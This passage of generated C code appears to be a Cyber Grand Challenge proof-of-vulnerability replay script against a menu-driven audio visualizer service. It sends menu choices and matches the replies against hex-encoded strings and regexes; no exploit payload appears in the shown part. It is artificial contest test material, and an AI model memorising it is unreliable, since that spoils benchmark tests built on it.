         "\x73\x75\x61\x6c\x69\x7a\x65\x72\x0a\x35\x2e\x20\x45\x6e\x61\x62"
         "\x6c\x65\x20\x4c\x6f\x77\x20\x50\x61\x73\x73\x20\x46\x69\x6c\x74"
         "\x65\x72\x0a\x36\x2e\x20\x45\x6e\x61\x62\x6c\x65\x20\x48\x69\x67"
         "\x68\x20\x50\x61\x73\x73\x20\x46\x69\x6c\x74\x65\x72\x0a\x37\x2e"
         "\x20\x44\x69\x73\x61\x62\x6c\x65\x20\x46\x69\x6c\x74\x65\x72\x73"
         "\x0a\x38\x2e\x20\x53\x65\x74\x20\x76\x69\x73\x75\x61\x6c\x69\x7a"
         "\x61\x74\x69\x6f\x6e\x20\x73\x70\x65\x65\x64\x20\x6d\x75\x6c\x74"
         "\x69\x70\x6c\x69\x65\x72\x20\x28\x30\x2d\x39\x29\x0a\x39\x2e\x20"
         "\x51\x75\x69\x74";
      read_00012_ptr += cgc_data_match(read_00012 + read_00012_ptr, read_00012_len - read_00012_ptr, match_00012_00000, 196);
      cgc_free(read_00012);
      if (read_00012_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00013;
      unsigned int read_00013_len;
      unsigned int read_00013_ptr = 0;
      //**** delimited read
      static unsigned char read_00013_delim[] = 
         "\x3a\x3a\x0a\x0a";
      read_00013 = NULL;
      read_00013_len = 0;
      int read_00013_res = cgc_delimited_read(0, &read_00013, &read_00013_len, read_00013_delim, 4);
      if (read_00013_res) {} //silence unused variable warning
      /* read match pcre:
--Current\ Track:\ Sampled\ @\d{4,5}Hz\ (?:8|16)\ bit,\ (?:Stereo|Mono)\ -\ Data\ Size=\d*
::Options:\ Filter\ Type=(?:None|Low\ Pass|High\ Pass)\ \|\ Visualization\ Slowdown\ Multiplier=[0-9]
*/
      static char read_00013_00000_regex[] = 
         "\x2d\x2d\x43\x75\x72\x72\x65\x6e\x74\x5c\x20\x54\x72\x61\x63\x6b"
         "\x3a\x5c\x20\x53\x61\x6d\x70\x6c\x65\x64\x5c\x20\x40\x5c\x64\x7b"
         "\x34\x2c\x35\x7d\x48\x7a\x5c\x20\x28\x3f\x3a\x38\x7c\x31\x36\x29"
         "\x5c\x20\x62\x69\x74\x2c\x5c\x20\x28\x3f\x3a\x53\x74\x65\x72\x65"
         "\x6f\x7c\x4d\x6f\x6e\x6f\x29\x5c\x20\x2d\x5c\x20\x44\x61\x74\x61"
         "\x5c\x20\x53\x69\x7a\x65\x3d\x5c\x64\x2a\x0a\x3a\x3a\x4f\x70\x74"
         "\x69\x6f\x6e\x73\x3a\x5c\x20\x46\x69\x6c\x74\x65\x72\x5c\x20\x54"
         "\x79\x70\x65\x3d\x28\x3f\x3a\x4e\x6f\x6e\x65\x7c\x4c\x6f\x77\x5c"
         "\x20\x50\x61\x73\x73\x7c\x48\x69\x67\x68\x5c\x20\x50\x61\x73\x73"
         "\x29\x5c\x20\x5c\x7c\x5c\x20\x56\x69\x73\x75\x61\x6c\x69\x7a\x61"
         "\x74\x69\x6f\x6e\x5c\x20\x53\x6c\x6f\x77\x64\x6f\x77\x6e\x5c\x20"
         "\x4d\x75\x6c\x74\x69\x70\x6c\x69\x65\x72\x3d\x5b\x30\x2d\x39\x5d";
      static match_result read_00013_00000_match;
      pcre *read_00013_00000_pcre = cgc_init_regex(read_00013_00000_regex);
      if (read_00013_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00013_00000_pcre, 0, read_00013 + read_00013_ptr, read_00013_len - read_00013_ptr, &read_00013_00000_match);
         if (rc > 0) {
            read_00013_ptr += read_00013_00000_match.match_end - read_00013_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00013_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00013);
      if (read_00013_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00007_00000[] = 
         "\x37\x0a";
      static unsigned int write_00007_00000_len = 2;
      unsigned char *write_00007 = NULL;
      unsigned int write_00007_len = 0;
      write_00007 = cgc_append_buf(write_00007, &write_00007_len, write_00007_00000, write_00007_00000_len);
      if (write_00007_len > 0) {
         cgc_transmit_all(1, write_00007, write_00007_len);
      }
      cgc_free(write_00007);
   } while (0);
   do {
      unsigned char *read_00014;
      unsigned int read_00014_len;
      unsigned int read_00014_ptr = 0;
      //**** delimited read
      static unsigned char read_00014_delim[] = 
         "\x0a\x0a";
      read_00014 = NULL;
      read_00014_len = 0;
      int read_00014_res = cgc_delimited_read(0, &read_00014, &read_00014_len, read_00014_delim, 2);
      if (read_00014_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00014_00000[] = 
         "\x31\x2e\x20\x4c\x6f\x61\x64\x20\x4e\x65\x77\x20\x46\x69\x6c\x65"
         "\x0a\x32\x2e\x20\x57\x61\x76\x65\x20\x56\x69\x73\x75\x61\x6c\x69"
         "\x7a\x65\x72\x0a\x33\x2e\x20\x45\x51\x20\x56\x69\x73\x75\x61\x6c"
         "\x69\x7a\x65\x72\x0a\x34\x2e\x20\x50\x6f\x77\x65\x72\x20\x56\x69"
         "\x73\x75\x61\x6c\x69\x7a\x65\x72\x0a\x35\x2e\x20\x45\x6e\x61\x62"
         "\x6c\x65\x20\x4c\x6f\x77\x20\x50\x61\x73\x73\x20\x46\x69\x6c\x74"
         "\x65\x72\x0a\x36\x2e\x20\x45\x6e\x61\x62\x6c\x65\x20\x48\x69\x67"
         "\x68\x20\x50\x61\x73\x73\x20\x46\x69\x6c\x74\x65\x72\x0a\x37\x2e"
         "\x20\x44\x69\x73\x61\x62\x6c\x65\x20\x46\x69\x6c\x74\x65\x72\x73"
         "\x0a\x38\x2e\x20\x53\x65\x74\x20\x76\x69\x73\x75\x61\x6c\x69\x7a"
         "\x61\x74\x69\x6f\x6e\x20\x73\x70\x65\x65\x64\x20\x6d\x75\x6c\x74"
         "\x69\x70\x6c\x69\x65\x72\x20\x28\x30\x2d\x39\x29\x0a\x39\x2e\x20"
         "\x51\x75\x69\x74";
      read_00014_ptr += cgc_data_match(read_00014 + read_00014_ptr, read_00014_len - read_00014_ptr, match_00014_00000, 196);
      cgc_free(read_00014);
      if (read_00014_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00015;
      unsigned int read_00015_len;
      unsigned int read_00015_ptr = 0;
      //**** delimited read
      static unsigned char read_00015_delim[] = 
         "\x3a\x3a\x0a\x0a";
      read_00015 = NULL;
      read_00015_len = 0;
      int read_00015_res = cgc_delimited_read(0, &read_00015, &read_00015_len, read_00015_delim, 4);
      if (read_00015_res) {} //silence unused variable warning
      /* read match pcre:
--Current\ Track:\ Sampled\ @\d{4,5}Hz\ (?:8|16)\ bit,\ (?:Stereo|Mono)\ -\ Data\ Size=\d*
::Options:\ Filter\ Type=(?:None|Low\ Pass|High\ Pass)\ \|\ Visualization\ Slowdown\ Multiplier=[0-9]
*/
      static char read_00015_00000_regex[] = 
         "\x2d\x2d\x43\x75\x72\x72\x65\x6e\x74\x5c\x20\x54\x72\x61\x63\x6b"
         "\x3a\x5c\x20\x53\x61\x6d\x70\x6c\x65\x64\x5c\x20\x40\x5c\x64\x7b"
         "\x34\x2c\x35\x7d\x48\x7a\x5c\x20\x28\x3f\x3a\x38\x7c\x31\x36\x29"
         "\x5c\x20\x62\x69\x74\x2c\x5c\x20\x28\x3f\x3a\x53\x74\x65\x72\x65"
         "\x6f\x7c\x4d\x6f\x6e\x6f\x29\x5c\x20\x2d\x5c\x20\x44\x61\x74\x61"
         "\x5c\x20\x53\x69\x7a\x65\x3d\x5c\x64\x2a\x0a\x3a\x3a\x4f\x70\x74"
         "\x69\x6f\x6e\x73\x3a\x5c\x20\x46\x69\x6c\x74\x65\x72\x5c\x20\x54"
         "\x79\x70\x65\x3d\x28\x3f\x3a\x4e\x6f\x6e\x65\x7c\x4c\x6f\x77\x5c"
         "\x20\x50\x61\x73\x73\x7c\x48\x69\x67\x68\x5c\x20\x50\x61\x73\x73"
         "\x29\x5c\x20\x5c\x7c\x5c\x20\x56\x69\x73\x75\x61\x6c\x69\x7a\x61"
         "\x74\x69\x6f\x6e\x5c\x20\x53\x6c\x6f\x77\x64\x6f\x77\x6e\x5c\x20"
         "\x4d\x75\x6c\x74\x69\x70\x6c\x69\x65\x72\x3d\x5b\x30\x2d\x39\x5d";
      static match_result read_00015_00000_match;
      pcre *read_00015_00000_pcre = cgc_init_regex(read_00015_00000_regex);
      if (read_00015_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00015_00000_pcre, 0, read_00015 + read_00015_ptr, read_00015_len - read_00015_ptr, &read_00015_00000_match);
         if (rc > 0) {
            read_00015_ptr += read_00015_00000_match.match_end - read_00015_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00015_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00015);
      if (read_00015_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00008_00000[] = 
         "\x36\x0a";
      static unsigned int write_00008_00000_len = 2;
      unsigned char *write_00008 = NULL;
      unsigned int write_00008_len = 0;
      write_00008 = cgc_append_buf(write_00008, &write_00008_len, write_00008_00000, write_00008_00000_len);
      if (write_00008_len > 0) {
         cgc_transmit_all(1, write_00008, write_00008_len);
      }
      cgc_free(write_00008);
   } while (0);
   do {
      unsigned char *read_00016;
      unsigned int read_00016_len;
      unsigned int read_00016_ptr = 0;
      //**** delimited read
      static unsigned char read_00016_delim[] = 
         "\x0a\x0a";
      read_00016 = NULL;
      read_00016_len = 0;
      int read_00016_res = cgc_delimited_read(0, &read_00016, &read_00016_len, read_00016_delim, 2);
      if (read_00016_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00016_00000[] = 
         "\x31\x2e\x20\x4c\x6f\x61\x64\x20\x4e\x65\x77\x20\x46\x69\x6c\x65"
         "\x0a\x32\x2e\x20\x57\x61\x76\x65\x20\x56\x69\x73\x75\x61\x6c\x69"
         "\x7a\x65\x72\x0a\x33\x2e\x20\x45\x51\x20\x56\x69\x73\x75\x61\x6c"
         "\x69\x7a\x65\x72\x0a\x34\x2e\x20\x50\x6f\x77\x65\x72\x20\x56\x69"
         "\x73\x75\x61\x6c\x69\x7a\x65\x72\x0a\x35\x2e\x20\x45\x6e\x61\x62"
         "\x6c\x65\x20\x4c\x6f\x77\x20\x50\x61\x73\x73\x20\x46\x69\x6c\x74"
         "\x65\x72\x0a\x36\x2e\x20\x45\x6e\x61\x62\x6c\x65\x20\x48\x69\x67"
         "\x68\x20\x50\x61\x73\x73\x20\x46\x69\x6c\x74\x65\x72\x0a\x37\x2e"
         "\x20\x44\x69\x73\x61\x62\x6c\x65\x20\x46\x69\x6c\x74\x65\x72\x73"
         "\x0a\x38\x2e\x20\x53\x65\x74\x20\x76\x69\x73\x75\x61\x6c\x69\x7a"
         "\x61\x74\x69\x6f\x6e\x20\x73\x70\x65\x65\x64\x20\x6d\x75\x6c\x74"
         "\x69\x70\x6c\x69\x65\x72\x20\x28\x30\x2d\x39\x29\x0a\x39\x2e\x20"
         "\x51\x75\x69\x74";
      read_00016_ptr += cgc_data_match(read_00016 + read_00016_ptr, read_00016_len - read_00016_ptr, match_00016_00000, 196);
      cgc_free(read_00016);
      if (read_00016_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00017;
      unsigned int read_00017_len;
      unsigned int read_00017_ptr = 0;
      //**** delimited read
      static unsigned char read_00017_delim[] = 
         "\x3a\x3a\x0a\x0a";
      read_00017 = NULL;
      read_00017_len = 0;
      int read_00017_res = cgc_delimited_read(0, &read_00017, &read_00017_len, read_00017_delim, 4);
      if (read_00017_res) {} //silence unused variable warning
      /* read match pcre:
--Current\ Track:\ Sampled\ @\d{4,5}Hz\ (?:8|16)\ bit,\ (?:Stereo|Mono)\ -\ Data\ Size=\d*
::Options:\ Filter\ Type=(?:None|Low\ Pass|High\ Pass)\ \|\ Visualization\ Slowdown\ Multiplier=[0-9]
*/
      static char read_00017_00000_regex[] = 
         "\x2d\x2d\x43\x75\x72\x72\x65\x6e\x74\x5c\x20\x54\x72\x61\x63\x6b"
         "\x3a\x5c\x20\x53\x61\x6d\x70\x6c\x65\x64\x5c\x20\x40\x5c\x64\x7b"
         "\x34\x2c\x35\x7d\x48\x7a\x5c\x20\x28\x3f\x3a\x38\x7c\x31\x36\x29"
         "\x5c\x20\x62\x69\x74\x2c\x5c\x20\x28\x3f\x3a\x53\x74\x65\x72\x65"
         "\x6f\x7c\x4d\x6f\x6e\x6f\x29\x5c\x20\x2d\x5c\x20\x44\x61\x74\x61"
         "\x5c\x20\x53\x69\x7a\x65\x3d\x5c\x64\x2a\x0a\x3a\x3a\x4f\x70\x74"
         "\x69\x6f\x6e\x73\x3a\x5c\x20\x46\x69\x6c\x74\x65\x72\x5c\x20\x54"
         "\x79\x70\x65\x3d\x28\x3f\x3a\x4e\x6f\x6e\x65\x7c\x4c\x6f\x77\x5c"
         "\x20\x50\x61\x73\x73\x7c\x48\x69\x67\x68\x5c\x20\x50\x61\x73\x73"
         "\x29\x5c\x20\x5c\x7c\x5c\x20\x56\x69\x73\x75\x61\x6c\x69\x7a\x61"
         "\x74\x69\x6f\x6e\x5c\x20\x53\x6c\x6f\x77\x64\x6f\x77\x6e\x5c\x20"
         "\x4d\x75\x6c\x74\x69\x70\x6c\x69\x65\x72\x3d\x5b\x30\x2d\x39\x5d";
      static match_result read_00017_00000_match;
      pcre *read_00017_00000_pcre = cgc_init_regex(read_00017_00000_regex);
      if (read_00017_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00017_00000_pcre, 0, read_00017 + read_00017_ptr, read_00017_len - read_00017_ptr, &read_00017_00000_match);
         if (rc > 0) {
            read_00017_ptr += read_00017_00000_match.match_end - read_00017_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00017_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00017);
      if (read_00017_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00009_00000[] = 
         "\x36\x0a";
      static unsigned int write_00009_00000_len = 2;
      unsigned char *write_00009 = NULL;
      unsigned int write_00009_len = 0;
      write_00009 = cgc_append_buf(write_00009, &write_00009_len, write_00009_00000, write_00009_00000_len);
      if (write_00009_len > 0) {
         cgc_transmit_all(1, write_00009, write_00009_len);
      }
      cgc_free(write_00009);
   } while (0);
   do {
      unsigned char *read_00018;
      unsigned int read_00018_len;
      unsigned int read_00018_ptr = 0;
      //**** delimited read
      static unsigned char read_00018_delim[] = 
         "\x0a\x0a";
      read_00018 = NULL;
      read_00018_len = 0;
      int read_00018_res = cgc_delimited_read(0, &read_00018, &read_00018_len, read_00018_delim, 2);
      if (read_00018_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00018_00000[] = 
         "\x31\x2e\x20\x4c\x6f\x61\x64\x20\x4e\x65\x77\x20\x46\x69\x6c\x65"
         "\x0a\x32\x2e\x20\x57\x61\x76\x65\x20\x56\x69\x73\x75\x61\x6c\x69"
         "\x7a\x65\x72\x0a\x33\x2e\x20\x45\x51\x20\x56\x69\x73\x75\x61\x6c"
         "\x69\x7a\x65\x72\x0a\x34\x2e\x20\x50\x6f\x77\x65\x72\x20\x56\x69"
         "\x73\x75\x61\x6c\x69\x7a\x65\x72\x0a\x35\x2e\x20\x45\x6e\x61\x62"
         "\x6c\x65\x20\x4c\x6f\x77\x20\x50\x61\x73\x73\x20\x46\x69\x6c\x74"
         "\x65\x72\x0a\x36\x2e\x20\x45\x6e\x61\x62\x6c\x65\x20\x48\x69\x67"
         "\x68\x20\x50\x61\x73\x73\x20\x46\x69\x6c\x74\x65\x72\x0a\x37\x2e"
         "\x20\x44\x69\x73\x61\x62\x6c\x65\x20\x46\x69\x6c\x74\x65\x72\x73"
         "\x0a\x38\x2e\x20\x53\x65\x74\x20\x76\x69\x73\x75\x61\x6c\x69\x7a"
         "\x61\x74\x69\x6f\x6e\x20\x73\x70\x65\x65\x64\x20\x6d\x75\x6c\x74"
         "\x69\x70\x6c\x69\x65\x72\x20\x28\x30\x2d\x39\x29\x0a\x39\x2e\x20"
         "\x51\x75\x69\x74";
      read_00018_ptr += cgc_data_match(read_00018 + read_00018_ptr, read_00018_len - read_00018_ptr, match_00018_00000, 196);
      cgc_free(read_00018);
      if (read_00018_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00019;
      unsigned int read_00019_len;
      unsigned int read_00019_ptr = 0;
      //**** delimited read
      static unsigned char read_00019_delim[] = 
         "\x3a\x3a\x0a\x0a";
      read_00019 = NULL;
      read_00019_len = 0;
      int read_00019_res = cgc_delimited_read(0, &read_00019, &read_00019_len, read_00019_delim, 4);
      if (read_00019_res) {} //silence unused variable warning
      /* read match pcre:
--Current\ Track:\ Sampled\ @\d{4,5}Hz\ (?:8|16)\ bit,\ (?:Stereo|Mono)\ -\ Data\ Size=\d*
::Options:\ Filter\ Type=(?:None|Low\ Pass|High\ Pass)\ \|\ Visualization\ Slowdown\ Multiplier=[0-9]
*/
      static char read_00019_00000_regex[] = 
         "\x2d\x2d\x43\x75\x72\x72\x65\x6e\x74\x5c\x20\x54\x72\x61\x63\x6b"
         "\x3a\x5c\x20\x53\x61\x6d\x70\x6c\x65\x64\x5c\x20\x40\x5c\x64\x7b"
         "\x34\x2c\x35\x7d\x48\x7a\x5c\x20\x28\x3f\x3a\x38\x7c\x31\x36\x29"
         "\x5c\x20\x62\x69\x74\x2c\x5c\x20\x28\x3f\x3a\x53\x74\x65\x72\x65"
         "\x6f\x7c\x4d\x6f\x6e\x6f\x29\x5c\x20\x2d\x5c\x20\x44\x61\x74\x61"
         "\x5c\x20\x53\x69\x7a\x65\x3d\x5c\x64\x2a\x0a\x3a\x3a\x4f\x70\x74"
         "\x69\x6f\x6e\x73\x3a\x5c\x20\x46\x69\x6c\x74\x65\x72\x5c\x20\x54"
         "\x79\x70\x65\x3d\x28\x3f\x3a\x4e\x6f\x6e\x65\x7c\x4c\x6f\x77\x5c"
         "\x20\x50\x61\x73\x73\x7c\x48\x69\x67\x68\x5c\x20\x50\x61\x73\x73"
         "\x29\x5c\x20\x5c\x7c\x5c\x20\x56\x69\x73\x75\x61\x6c\x69\x7a\x61"
         "\x74\x69\x6f\x6e\x5c\x20\x53\x6c\x6f\x77\x64\x6f\x77\x6e\x5c\x20"
         "\x4d\x75\x6c\x74\x69\x70\x6c\x69\x65\x72\x3d\x5b\x30\x2d\x39\x5d";
      static match_result read_00019_00000_match;
      pcre *read_00019_00000_pcre = cgc_init_regex(read_00019_00000_regex);
      if (read_00019_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00019_00000_pcre, 0, read_00019 + read_00019_ptr, read_00019_len - read_00019_ptr, &read_00019_00000_match);
         if (rc > 0) {
            read_00019_ptr += read_00019_00000_match.match_end - read_00019_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00019_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00019);
      if (read_00019_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00010_00000[] = 
         "\x34\x0a";
      static unsigned int write_00010_00000_len = 2;
      unsigned char *write_00010 = NULL;
      unsigned int write_00010_len = 0;
      write_00010 = cgc_append_buf(write_00010, &write_00010_len, write_00010_00000, write_00010_00000_len);
      if (write_00010_len > 0) {
         cgc_transmit_all(1, write_00010, write_00010_len);
      }
      cgc_free(write_00010);
   } while (0);
   do {
      unsigned char *read_00020;
      unsigned int read_00020_len;
      unsigned int read_00020_ptr = 0;
      //**** delimited read
      static unsigned char read_00020_delim[] = 
         "\x2b\x2b\x2b\x2b\x45\x4e\x44\x20\x56\x49\x53\x55\x41\x4c\x49\x5a"
         "\x41\x54\x49\x4f\x4e\x2b\x2b\x2b\x2b\x0a\x0a";
      read_00020 = NULL;
      read_00020_len = 0;
      int read_00020_res = cgc_delimited_read(0, &read_00020, &read_00020_len, read_00020_delim, 27);
      if (read_00020_res) {} //silence unused variable warning
      /* read match pcre:
(?:=*]
)*
*/
      static char read_00020_00000_regex[] = 
         "\x28\x3f\x3a\x3d\x2a\x5d\x0a\x29\x2a";
      static match_result read_00020_00000_match;
      pcre *read_00020_00000_pcre = cgc_init_regex(read_00020_00000_regex);
      if (read_00020_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00020_00000_pcre, 0, read_00020 + read_00020_ptr, read_00020_len - read_00020_ptr, &read_00020_00000_match);
         if (rc > 0) {
            read_00020_ptr += read_00020_00000_match.match_end - read_00020_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00020_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00020);
      if (read_00020_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00021;
      unsigned int read_00021_len;
      unsigned int read_00021_ptr = 0;
      //**** delimited read
      static unsigned char read_00021_delim[] = 
         "\x0a\x0a";
      read_00021 = NULL;
      read_00021_len = 0;
      int read_00021_res = cgc_delimited_read(0, &read_00021, &read_00021_len, read_00021_delim, 2);
      if (read_00021_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00021_00000[] = 
         "\x31\x2e\x20\x4c\x6f\x61\x64\x20\x4e\x65\x77\x20\x46\x69\x6c\x65"
         "\x0a\x32\x2e\x20\x57\x61\x76\x65\x20\x56\x69\x73\x75\x61\x6c\x69"
         "\x7a\x65\x72\x0a\x33\x2e\x20\x45\x51\x20\x56\x69\x73\x75\x61\x6c"
         "\x69\x7a\x65\x72\x0a\x34\x2e\x20\x50\x6f\x77\x65\x72\x20\x56\x69"
         "\x73\x75\x61\x6c\x69\x7a\x65\x72\x0a\x35\x2e\x20\x45\x6e\x61\x62"
         "\x6c\x65\x20\x4c\x6f\x77\x20\x50\x61\x73\x73\x20\x46\x69\x6c\x74"
         "\x65\x72\x0a\x36\x2e\x20\x45\x6e\x61\x62\x6c\x65\x20\x48\x69\x67"
         "\x68\x20\x50\x61\x73\x73\x20\x46\x69\x6c\x74\x65\x72\x0a\x37\x2e"
         "\x20\x44\x69\x73\x61\x62\x6c\x65\x20\x46\x69\x6c\x74\x65\x72\x73"
         "\x0a\x38\x2e\x20\x53\x65\x74\x20\x76\x69\x73\x75\x61\x6c\x69\x7a"
         "\x61\x74\x69\x6f\x6e\x20\x73\x70\x65\x65\x64\x20\x6d\x75\x6c\x74"
         "\x69\x70\x6c\x69\x65\x72\x20\x28\x30\x2d\x39\x29\x0a\x39\x2e\x20"
         "\x51\x75\x69\x74";
      read_00021_ptr += cgc_data_match(read_00021 + read_00021_ptr, read_00021_len - read_00021_ptr, match_00021_00000, 196);
      cgc_free(read_00021);
      if (read_00021_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00022;
      unsigned int read_00022_len;
      unsigned int read_00022_ptr = 0;
      //**** delimited read
      static unsigned char read_00022_delim[] = 
         "\x3a\x3a\x0a\x0a";
      read_00022 = NULL;
      read_00022_len = 0;
      int read_00022_res = cgc_delimited_read(0, &read_00022, &read_00022_len, read_00022_delim, 4);
      if (read_00022_res) {} //silence unused variable warning
      /* read match pcre:
--Current\ Track:\ Sampled\ @\d{4,5}Hz\ (?:8|16)\ bit,\ (?:Stereo|Mono)\ -\ Data\ Size=\d*
::Options:\ Filter\ Type=(?:None|Low\ Pass|High\ Pass)\ \|\ Visualization\ Slowdown\ Multiplier=[0-9]
*/
      static char read_00022_00000_regex[] = 
         "\x2d\x2d\x43\x75\x72\x72\x65\x6e\x74\x5c\x20\x54\x72\x61\x63\x6b"
         "\x3a\x5c\x20\x53\x61\x6d\x70\x6c\x65\x64\x5c\x20\x40\x5c\x64\x7b"
         "\x34\x2c\x35\x7d\x48\x7a\x5c\x20\x28\x3f\x3a\x38\x7c\x31\x36\x29"
         "\x5c\x20\x62\x69\x74\x2c\x5c\x20\x28\x3f\x3a\x53\x74\x65\x72\x65"
         "\x6f\x7c\x4d\x6f\x6e\x6f\x29\x5c\x20\x2d\x5c\x20\x44\x61\x74\x61"
         "\x5c\x20\x53\x69\x7a\x65\x3d\x5c\x64\x2a\x0a\x3a\x3a\x4f\x70\x74"
         "\x69\x6f\x6e\x73\x3a\x5c\x20\x46\x69\x6c\x74\x65\x72\x5c\x20\x54"
         "\x79\x70\x65\x3d\x28\x3f\x3a\x4e\x6f\x6e\x65\x7c\x4c\x6f\x77\x5c"
         "\x20\x50\x61\x73\x73\x7c\x48\x69\x67\x68\x5c\x20\x50\x61\x73\x73"
         "\x29\x5c\x20\x5c\x7c\x5c\x20\x56\x69\x73\x75\x61\x6c\x69\x7a\x61"
         "\x74\x69\x6f\x6e\x5c\x20\x53\x6c\x6f\x77\x64\x6f\x77\x6e\x5c\x20"
         "\x4d\x75\x6c\x74\x69\x70\x6c\x69\x65\x72\x3d\x5b\x30\x2d\x39\x5d";
      static match_result read_00022_00000_match;
      pcre *read_00022_00000_pcre = cgc_init_regex(read_00022_00000_regex);
      if (read_00022_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00022_00000_pcre, 0, read_00022 + read_00022_ptr, read_00022_len - read_00022_ptr, &read_00022_00000_match);
         if (rc > 0) {
            read_00022_ptr += read_00022_00000_match.match_end - read_00022_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00022_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00022);
      if (read_00022_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00011_00000[] = 
         "\x30\x0a";
      static unsigned int write_00011_00000_len = 2;
      unsigned char *write_00011 = NULL;
      unsigned int write_00011_len = 0;
      write_00011 = cgc_append_buf(write_00011, &write_00011_len, write_00011_00000, write_00011_00000_len);
      if (write_00011_len > 0) {
         cgc_transmit_all(1, write_00011, write_00011_len);
      }
      cgc_free(write_00011);
   } while (0);
   do {
      unsigned char *read_00023;
      unsigned int read_00023_len;
      unsigned int read_00023_ptr = 0;
      //**** delimited read
      static unsigned char read_00023_delim[] = 
         "\x0a";
      read_00023 = NULL;
      read_00023_len = 0;
      int read_00023_res = cgc_delimited_read(0, &read_00023, &read_00023_len, read_00023_delim, 1);
      if (read_00023_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00023_00000[] = 
         "\x45\x52\x52\x4f\x52\x3a\x20\x42\x61\x64\x20\x43\x68\x6f\x69\x63"
         "\x65\x2e\x20\x53\x65\x6c\x65\x63\x74\x20\x61\x6e\x6f\x74\x68\x65"
         "\x72\x20\x6f\x70\x74\x69\x6f\x6e";
      read_00023_ptr += cgc_data_match(read_00023 + read_00023_ptr, read_00023_len - read_00023_ptr, match_00023_00000, 40);
      cgc_free(read_00023);
      if (read_00023_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00024;
      unsigned int read_00024_len;
      unsigned int read_00024_ptr = 0;
      //**** delimited read
      static unsigned char read_00024_delim[] = 
         "\x0a\x0a";
      read_00024 = NULL;
      read_00024_len = 0;
      int read_00024_res = cgc_delimited_read(0, &read_00024, &read_00024_len, read_00024_delim, 2);
      if (read_00024_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00024_00000[] = 
         "\x31\x2e\x20\x4c\x6f\x61\x64\x20\x4e\x65\x77\x20\x46\x69\x6c\x65"
         "\x0a\x32\x2e\x20\x57\x61\x76\x65\x20\x56\x69\x73\x75\x61\x6c\x69"
         "\x7a\x65\x72\x0a\x33\x2e\x20\x45\x51\x20\x56\x69\x73\x75\x61\x6c"
         "\x69\x7a\x65\x72\x0a\x34\x2e\x20\x50\x6f\x77\x65\x72\x20\x56\x69"
         "\x73\x75\x61\x6c\x69\x7a\x65\x72\x0a\x35\x2e\x20\x45\x6e\x61\x62"
         "\x6c\x65\x20\x4c\x6f\x77\x20\x50\x61\x73\x73\x20\x46\x69\x6c\x74"
         "\x65\x72\x0a\x36\x2e\x20\x45\x6e\x61\x62\x6c\x65\x20\x48\x69\x67"
         "\x68\x20\x50\x61\x73\x73\x20\x46\x69\x6c\x74\x65\x72\x0a\x37\x2e"
         "\x20\x44\x69\x73\x61\x62\x6c\x65\x20\x46\x69\x6c\x74\x65\x72\x73"
         "\x0a\x38\x2e\x20\x53\x65\x74\x20\x76\x69\x73\x75\x61\x6c\x69\x7a"
         "\x61\x74\x69\x6f\x6e\x20\x73\x70\x65\x65\x64\x20\x6d\x75\x6c\x74"
         "\x69\x70\x6c\x69\x65\x72\x20\x28\x30\x2d\x39\x29\x0a\x39\x2e\x20"
         "\x51\x75\x69\x74";
      read_00024_ptr += cgc_data_match(read_00024 + read_00024_ptr, read_00024_len - read_00024_ptr, match_00024_00000, 196);
      cgc_free(read_00024);
      if (read_00024_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00025;
      unsigned int read_00025_len;
      unsigned int read_00025_ptr = 0;
